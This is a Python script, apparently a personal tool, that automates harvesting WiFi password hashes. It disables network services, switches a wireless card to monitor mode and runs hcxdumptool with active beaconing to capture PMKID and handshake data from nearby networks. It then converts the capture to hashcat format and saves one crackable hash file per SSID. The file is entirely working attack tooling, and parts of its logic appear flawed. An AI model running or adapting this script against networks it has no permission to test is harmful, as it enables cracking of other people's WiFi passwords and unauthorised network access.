import os
import csv
import subprocess
import time
import numpy as np

def sudo_check():
    if not 'SUDO_UID' in os.environ.keys():
        print('Make sure to run in sudo.')
        exit()

def new_session():
    global session, sesh
    storage = os.path.join(os.getcwd(), 'wifi-sweep')
    session = 'session-' + str((int(time.time()) % 1000000000))
    sesh = os.path.join(storage, session)
    if not os.path.exists(storage):
        os.mkdir('wifi-sweep')
        os.mkdir(sesh)
    else:
        os.mkdir(sesh)

def find_nic():
    ps = subprocess.Popen(('iw', 'dev'), stdout=subprocess.PIPE)
    nics = subprocess.check_output(('awk', '$1=="Interface"{print $2}'), stdin=ps.stdout).decode("utf-8").strip().split("\n")
    return nics

def monitor_On():
    subprocess.run(['ifconfig', NIC, 'down'])
    subprocess.run(['iwconfig', NIC, 'mode', 'monitor'])
    subprocess.run(['ifconfig', NIC, 'up'])

def monitor_Off():
    subprocess.run(['ifconfig', NIC, 'down'])
    subprocess.run(['iwconfig', NIC, 'mode', 'managed'])
    subprocess.run(['ifconfig', NIC, 'up'])

def networking_On():
    subprocess.run(['systemctl', 'start', 'NetworkManager.service'])
    subprocess.run(['systemctl', 'start', 'wpa_supplicant.service'])

def networking_Off():
    subprocess.run(['systemctl', 'stop', 'NetworkManager.service'])
    subprocess.run(['systemctl', 'stop', 'wpa_supplicant.service'])

def myNIC():
    global NIC
    network_controllers = find_nic()
    if len(network_controllers) == 0:
        print('Please connect a network interface controller and try again!')
        networking_On()
        exit()

    while True:
        for index, controller in enumerate(network_controllers):
            print(f'{index} - {controller}')
        
        controller_choice = input('Please select the controller you want to put into monitor mode: ')

        try:
            if network_controllers[int(controller_choice)]:
                break
        except:
            print('Please make a valid selection!')

    NIC = network_controllers[int(controller_choice)]

def captureData():
    filename = 'dumpfile.pcapng'
    outfile = os.path.join(os.getcwd(), 'wifi-sweep', session, filename)
    try:
        subprocess.run(['hcxdumptool', '-i', NIC, '-o', outfile, '--active_beacon', '--enable_status=15'])
    except:
        convert(outfile)

def convert(file):
    print('Networking re-enabled successfully.')
    print('Converting data to hashes')
    hashOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'hash.hc22000')
    macOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'MACS.txt')
    f = open(macOut, 'w')
    subprocess.run(['hcxpcapngtool', '-o', hashOut, file])
    p1 = subprocess.Popen(['tshark', '-r', file, '-e', 'wlan.ssid', '-e', 'wlan.bssid', '-Tfields'], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(['grep', '^[A-Za-z0-9`~!@#$%^&*-_+=.,/\|;:]'], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.call(['sed', 's/://g'], stdin=p2.stdout, stdout=f)

def matchUP():
    macOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'MACS.txt')
    hashOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'hash.hc22000')

    if os.path.exists(hashOut):
        macs = []
        with open(macOut, 'r') as mf:
            reader = csv.reader(mf)
            for row in reader:
                macs += reader
        macs = np.char.split(macs)

        x = 0
        merged_macs = [None] * len(macs)
        for m in macs:
            merged_macs[x] = macs[x][0][-1]
            x += 1

        hashes = []
        with open(hashOut, 'r') as hf:
            reader = csv.reader(hf)
            for row in reader:
                hashes += reader

        merged_hashes = []
        for h in hashes:
            merged_hashes += h

        x= 0
        for item in merged_macs:
            y = 0
            for hashes in merged_hashes:
                if merged_macs[x] in merged_hashes[y]:
                    matchOut = os.path.join(os.getcwd(), 'wifi-sweep', session, macs[x][0][0])
                    with open(matchOut + '.hc22000', 'w') as wowoweewah:
                        wowoweewah.write(merged_hashes[y])
                y += 1
            x += 1 
    else:
        print('No password hashes captured, exiting.')

def quit():
    monitor_Off()
    networking_On()

if __name__ == '__main__':
    sudo_check()
    new_session()
    networking_Off()
    myNIC()
    monitor_On()
    captureData()
    matchUP()
    quit()
